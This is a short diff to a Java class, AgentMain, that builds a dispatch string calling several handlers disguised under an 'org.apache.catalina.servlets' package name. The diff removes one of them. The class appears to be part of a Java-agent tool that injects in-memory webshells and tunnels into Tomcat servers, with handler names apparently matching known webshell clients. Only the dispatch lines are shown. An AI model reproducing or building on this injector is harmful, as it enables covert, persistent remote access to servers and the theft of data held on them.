@@ -26,7 +26,6 @@ public class AgentMain {
             "org.apache.catalina.servlets.sl.C.doService(obj,url,method,in);\n"+
             "org.apache.catalina.servlets.sl.JS.doService(obj,url,method,in);\n"+
             "org.apache.catalina.servlets.sl.BX.doService(obj,url,method,in);\n"+
-            "org.apache.catalina.servlets.sl.GSL.doService(obj,url,method,in);\n"+
             "org.apache.catalina.servlets.sl.Suo5.doService(obj,url,method,in);\n"+
             "org.apache.catalina.servlets.sl.Neo.doService(obj,url,method,in);\n"+
             "org.apache.catalina.servlets.sl.WS.doService(obj,url,method,in);\n"+
